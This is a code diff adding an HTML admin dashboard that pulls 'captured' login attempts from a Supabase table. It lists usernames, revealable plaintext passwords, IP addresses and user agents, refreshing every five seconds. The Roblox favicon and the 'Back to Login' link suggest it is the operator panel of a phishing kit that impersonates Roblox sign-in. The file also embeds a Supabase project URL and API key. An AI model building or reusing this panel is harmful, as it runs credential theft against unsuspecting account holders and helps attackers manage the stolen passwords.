@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <link rel="icon" href="https://images.rbxcdn.com/23421382939a9f4ae8bbe60dbe2a3e7e.ico.gzip" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        /* ========== RESET ========== */
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: linear-gradient(135deg, #0f0c29 0%, #1a1a2e 40%, #16213e 100%);
+            color: #e0e0e0;
+            min-height: 100vh;
+        }
+
+        /* ========== HEADER ========== */
+        .dash-header {
+            padding: 24px 32px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .dash-title {
+            font-size: 22px;
+            font-weight: 800;
+            color: #fff;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .dash-title-badge {
+            background: linear-gradient(135deg, #00a2ff, #0066ff);
+            padding: 3px 10px;
+            border-radius: 6px;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .dash-header-actions {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .btn {
+            padding: 8px 18px;
+            border-radius: 8px;
+            border: none;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-family: inherit;
+        }
+
+        .btn-refresh {
+            background: rgba(0, 162, 255, 0.15);
+            color: #00a2ff;
+            border: 1px solid rgba(0, 162, 255, 0.3);
+        }
+
+        .btn-refresh:hover {
+            background: rgba(0, 162, 255, 0.25);
+        }
+
+        .btn-danger {
+            background: rgba(239, 68, 68, 0.12);
+            color: #ef4444;
+            border: 1px solid rgba(239, 68, 68, 0.25);
+        }
+
+        .btn-danger:hover {
+            background: rgba(239, 68, 68, 0.22);
+        }
+
+        .btn-back {
+            background: rgba(255, 255, 255, 0.06);
+            color: #b8b8b8;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .btn-back:hover {
+            background: rgba(255, 255, 255, 0.12);
+            color: #fff;
+        }
+
+        /* ========== STATS ========== */
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 16px;
+            padding: 24px 32px;
+        }
+
+        .stat-card {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            border-radius: 14px;
+            padding: 20px 24px;
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            transition: border-color 0.2s;
+        }
+
+        .stat-card:hover {
+            border-color: rgba(255, 255, 255, 0.15);
+        }
+
+        .stat-label {
+            font-size: 12px;
+            font-weight: 600;
+            color: #8e8e8e;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            margin-bottom: 8px;
+        }
+
+        .stat-value {
+            font-size: 32px;
+            font-weight: 800;
+            color: #fff;
+        }
+
+        .stat-value.blue {
+            color: #00a2ff;
+        }
+
+        .stat-value.green {
+            color: #02b757;
+        }
+
+        .stat-value.amber {
+            color: #f59e0b;
+        }
+
+        .stat-sub {
+            font-size: 11px;
+            color: #6b6b6b;
+            margin-top: 4px;
+        }
+
+        /* ========== TABLE ========== */
+        .table-container {
+            padding: 0 32px 32px;
+        }
+
+        .table-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.07);
+            border-radius: 14px;
+            overflow: hidden;
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+        }
+
+        .table-header-bar {
+            padding: 16px 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .table-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: #fff;
+        }
+
+        .auto-refresh-badge {
+            font-size: 11px;
+            color: #02b757;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .pulse-dot {
+            width: 8px;
+            height: 8px;
+            background: #02b757;
+            border-radius: 50%;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+
+            50% {
+                opacity: 0.5;
+                transform: scale(0.8);
+            }
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        thead {
+            background: rgba(255, 255, 255, 0.03);
+        }
+
+        th {
+            padding: 12px 16px;
+            text-align: left;
+            font-size: 11px;
+            font-weight: 700;
+            color: #8e8e8e;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        td {
+            padding: 14px 16px;
+            font-size: 13px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.04);
+            vertical-align: middle;
+        }
+
+        tr:hover td {
+            background: rgba(255, 255, 255, 0.02);
+        }
+
+        tr:last-child td {
+            border-bottom: none;
+        }
+
+        .td-username {
+            color: #00a2ff;
+            font-weight: 600;
+        }
+
+        .td-password {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+        }
+
+        .td-password-text {
+            letter-spacing: 1px;
+        }
+
+        .td-password-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #6b6b6b;
+            display: flex;
+            align-items: center;
+            padding: 4px;
+            border-radius: 4px;
+            transition: color 0.15s, background 0.15s;
+        }
+
+        .td-password-btn:hover {
+            color: #00a2ff;
+            background: rgba(0, 162, 255, 0.1);
+        }
+
+        .td-meta {
+            color: #6b6b6b;
+            font-size: 12px;
+        }
+
+        .td-time {
+            font-size: 12px;
+            color: #9e9e9e;
+        }
+
+        .td-delete-btn {
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #6b6b6b;
+            display: flex;
+            align-items: center;
+            padding: 6px;
+            border-radius: 6px;
+            transition: color 0.15s, background 0.15s;
+        }
+
+        .td-delete-btn:hover {
+            color: #ef4444;
+            background: rgba(239, 68, 68, 0.1);
+        }
+
+        /* Empty state */
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #6b6b6b;
+        }
+
+        .empty-state svg {
+            margin-bottom: 16px;
+            opacity: 0.3;
+        }
+
+        .empty-state h3 {
+            font-size: 16px;
+            color: #9e9e9e;
+            margin-bottom: 6px;
+        }
+
+        .empty-state p {
+            font-size: 13px;
+        }
+
+        /* Confirm modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.2s, visibility 0.2s;
+        }
+
+        .modal-overlay.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal-box {
+            background: #1e2030;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 14px;
+            padding: 28px 32px;
+            max-width: 380px;
+            width: 90%;
+            text-align: center;
+        }
+
+        .modal-box h3 {
+            font-size: 16px;
+            color: #fff;
+            margin-bottom: 8px;
+        }
+
+        .modal-box p {
+            font-size: 13px;
+            color: #8e8e8e;
+            margin-bottom: 20px;
+        }
+
+        .modal-actions {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+        }
+
+        .modal-actions .btn {
+            min-width: 100px;
+            justify-content: center;
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            background: #1e2030;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 12px 20px;
+            font-size: 13px;
+            color: #e0e0e0;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            z-index: 99999;
+            transform: translateY(20px);
+            opacity: 0;
+            transition: all 0.3s ease;
+        }
+
+        .toast.show {
+            transform: translateY(0);
+            opacity: 1;
+        }
+
+        .toast.success {
+            border-color: rgba(2, 183, 87, 0.3);
+        }
+
+        .toast.error {
+            border-color: rgba(239, 68, 68, 0.3);
+        }
+
+        /* Scrollbar */
+        .table-scroll {
+            overflow-x: auto;
+        }
+
+        .table-scroll::-webkit-scrollbar {
+            height: 6px;
+        }
+
+        .table-scroll::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .table-scroll::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+        }
+
+        /* ========== RESPONSIVE ========== */
+        @media (max-width: 768px) {
+            .dash-header {
+                padding: 16px;
+                flex-direction: column;
+                gap: 12px;
+                align-items: flex-start;
+            }
+
+            .stats-row {
+                padding: 16px;
+                grid-template-columns: 1fr;
+            }
+
+            .table-container {
+                padding: 0 16px 16px;
+            }
+
+            th,
+            td {
+                padding: 10px 12px;
+            }
+
+            .dash-header-actions {
+                width: 100%;
+                flex-wrap: wrap;
+            }
+
+            .btn {
+                flex: 1;
+                justify-content: center;
+                min-width: 0;
+            }
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+</head>
+
+<body>
+
+    <!-- ========== HEADER ========== -->
+    <header class="dash-header">
+        <div class="dash-title">
+            Dashboard
+            <span class="dash-title-badge">Admin</span>
+        </div>
+        <div class="dash-header-actions">
+            <button class="btn btn-refresh" id="refreshBtn" onclick="loadData()">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <path d="M23 4v6h-6" />
+                    <path d="M1 20v-6h6" />
+                    <path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15" />
+                </svg>
+                Refresh
+            </button>
+            <button class="btn btn-danger" id="clearBtn" onclick="confirmClearAll()">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <path d="M3 6h18M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2" />
+                </svg>
+                Clear All
+            </button>
+            <a href="index.html" class="btn btn-back">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <path d="M19 12H5m7-7l-7 7 7 7" />
+                </svg>
+                Back to Login
+            </a>
+        </div>
+    </header>
+
+    <!-- ========== STATS ========== -->
+    <div class="stats-row">
+        <div class="stat-card">
+            <div class="stat-label">Total Attempts</div>
+            <div class="stat-value blue" id="statTotal">—</div>
+            <div class="stat-sub">All time login attempts</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-label">Unique Users</div>
+            <div class="stat-value green" id="statUnique">—</div>
+            <div class="stat-sub">Distinct usernames captured</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-label">Latest Attempt</div>
+            <div class="stat-value amber" id="statLatest" style="font-size:18px;">—</div>
+            <div class="stat-sub">Most recent capture</div>
+        </div>
+    </div>
+
+    <!-- ========== TABLE ========== -->
+    <div class="table-container">
+        <div class="table-card">
+            <div class="table-header-bar">
+                <div class="table-title">Login Attempts</div>
+                <div class="auto-refresh-badge">
+                    <div class="pulse-dot"></div>
+                    Auto-refresh 5s
+                </div>
+            </div>
+            <div class="table-scroll">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>Time</th>
+                            <th>Username</th>
+                            <th>Password</th>
+                            <th>IP Address</th>
+                            <th>User Agent</th>
+                            <th></th>
+                        </tr>
+                    </thead>
+                    <tbody id="tableBody">
+                    </tbody>
+                </table>
+            </div>
+            <div class="empty-state" id="emptyState" style="display:none;">
+                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                    <rect x="2" y="3" width="20" height="18" rx="3" />
+                    <path d="M8 12h8M8 8h8M8 16h4" />
+                </svg>
+                <h3>No login attempts yet</h3>
+                <p>Captured credentials will appear here</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========== CLEAR ALL CONFIRM MODAL ========== -->
+    <div class="modal-overlay" id="confirmModal">
+        <div class="modal-box">
+            <h3>Clear All Data?</h3>
+            <p>This will permanently delete all captured login attempts. This action cannot be undone.</p>
+            <div class="modal-actions">
+                <button class="btn btn-back" onclick="closeModal()">Cancel</button>
+                <button class="btn btn-danger" onclick="clearAll()">Delete All</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========== TOAST ========== -->
+    <div class="toast" id="toast"></div>
+
+    <!-- ========== JAVASCRIPT ========== -->
+    <script>
+        // ---- SUPABASE CONFIG ----
+        const SUPABASE_URL = 'https://deiohgeudwyeuqloojyd.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRlaW9oZ2V1ZHd5ZXVxbG9vanlkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA4MTgyMTUsImV4cCI6MjA4NjM5NDIxNX0.dZY2x0-eM5M67oklbtA_toBtzKzYtNGEQSuDNBdk2ps';
+        const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        let attempts = [];
+
+        // ---- LOAD DATA ----
+        async function loadData() {
+            try {
+                const { data, error } = await supabaseClient
+                    .from('login_attempts')
+                    .select('*')
+                    .order('timestamp', { ascending: false });
+
+                if (error) throw error;
+                attempts = data || [];
+                renderStats();
+                renderTable();
+            } catch (err) {
+                console.error('Load error:', err);
+                showToast('Failed to load data', 'error');
+            }
+        }
+
+        // ---- RENDER STATS ----
+        function renderStats() {
+            document.getElementById('statTotal').textContent = attempts.length;
+            const uniqueUsers = new Set(attempts.map(a => a.username)).size;
+            document.getElementById('statUnique').textContent = uniqueUsers;
+
+            if (attempts.length > 0) {
+                const latest = new Date(attempts[0].timestamp);
+                const now = new Date();
+                const diff = Math.floor((now - latest) / 1000);
+                let timeStr;
+                if (diff < 60) timeStr = `${diff}s ago`;
+                else if (diff < 3600) timeStr = `${Math.floor(diff / 60)}m ago`;
+                else if (diff < 86400) timeStr = `${Math.floor(diff / 3600)}h ago`;
+                else timeStr = latest.toLocaleDateString();
+                document.getElementById('statLatest').textContent = timeStr;
+            } else {
+                document.getElementById('statLatest').textContent = '—';
+            }
+        }
+
+        // ---- RENDER TABLE ----
+        function renderTable() {
+            const tbody = document.getElementById('tableBody');
+            const emptyState = document.getElementById('emptyState');
+
+            if (attempts.length === 0) {
+                tbody.innerHTML = '';
+                emptyState.style.display = 'block';
+                return;
+            }
+
+            emptyState.style.display = 'none';
+            tbody.innerHTML = attempts.map((a, i) => {
+                const time = new Date(a.timestamp);
+                const timeStr = time.toLocaleString('en-US', {
+                    month: 'short', day: 'numeric',
+                    hour: '2-digit', minute: '2-digit', second: '2-digit'
+                });
+                const maskedPass = '•'.repeat(Math.min(a.password.length, 12));
+                const shortUA = a.user_agent ? (a.user_agent.length > 40 ? a.user_agent.substring(0, 40) + '…' : a.user_agent) : 'Unknown';
+
+                return `<tr>
+                    <td style="color:#6b6b6b;">${i + 1}</td>
+                    <td class="td-time">${timeStr}</td>
+                    <td class="td-username">${escapeHtml(a.username)}</td>
+                    <td>
+                        <div class="td-password">
+                            <span class="td-password-text" id="pass-${a.id}" data-revealed="false" data-password="${escapeAttr(a.password)}">${maskedPass}</span>
+                            <button class="td-password-btn" onclick="togglePassword('${a.id}')" title="Toggle password visibility">
+                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                            </button>
+                        </div>
+                    </td>
+                    <td class="td-meta">${a.ip_address || '—'}</td>
+                    <td class="td-meta" title="${escapeAttr(a.user_agent || '')}">${shortUA}</td>
+                    <td>
+                        <button class="td-delete-btn" onclick="deleteAttempt('${a.id}')" title="Delete entry">
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 6h18M19 6v14a2 2 0 01-2 2H7a2 2 0 01-2-2V6m3 0V4a2 2 0 012-2h4a2 2 0 012 2v2"/><line x1="10" y1="11" x2="10" y2="17"/><line x1="14" y1="11" x2="14" y2="17"/></svg>
+                        </button>
+                    </td>
+                </tr>`;
+            }).join('');
+        }
+
+        // ---- TOGGLE PASSWORD ----
+        function togglePassword(id) {
+            const el = document.getElementById(`pass-${id}`);
+            if (!el) return;
+            const revealed = el.dataset.revealed === 'true';
+            if (revealed) {
+                const masked = '•'.repeat(Math.min(el.dataset.password.length, 12));
+                el.textContent = masked;
+                el.dataset.revealed = 'false';
+            } else {
+                el.textContent = el.dataset.password;
+                el.dataset.revealed = 'true';
+            }
+        }
+
+        // ---- DELETE SINGLE ----
+        async function deleteAttempt(id) {
+            try {
+                const { error } = await supabaseClient
+                    .from('login_attempts')
+                    .delete()
+                    .eq('id', id);
+
+                if (error) throw error;
+                attempts = attempts.filter(a => a.id !== id);
+                renderStats();
+                renderTable();
+                showToast('Entry deleted', 'success');
+            } catch (err) {
+                showToast('Delete failed', 'error');
+            }
+        }
+
+        // ---- CLEAR ALL ----
+        function confirmClearAll() {
+            document.getElementById('confirmModal').classList.add('show');
+        }
+        function closeModal() {
+            document.getElementById('confirmModal').classList.remove('show');
+        }
+        async function clearAll() {
+            closeModal();
+            try {
+                const { error } = await supabaseClient
+                    .from('login_attempts')
+                    .delete()
+                    .neq('username', '___non_existent___');
+
+                if (error) throw error;
+                attempts = [];
+                renderStats();
+                renderTable();
+                showToast('All entries cleared', 'success');
+            } catch (err) {
+                showToast('Clear failed', 'error');
+            }
+        }
+
+        // ---- TOAST ----
+        function showToast(message, type = 'success') {
+            const toast = document.getElementById('toast');
+            toast.className = `toast ${type}`;
+            const icon = type === 'success'
+                ? '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#02b757" stroke-width="2.5"><path d="M20 6L9 17l-5-5"/></svg>'
+                : '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M15 9l-6 6M9 9l6 6"/></svg>';
+            toast.innerHTML = icon + message;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        // ---- HELPERS ----
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        function escapeAttr(text) {
+            return text.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/'/g, '&#39;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        }
+
+        // ---- INIT ----
+        loadData();
+        setInterval(loadData, 5000); // Auto-refresh every 5s
+    </script>
+</body>
+
+</html>
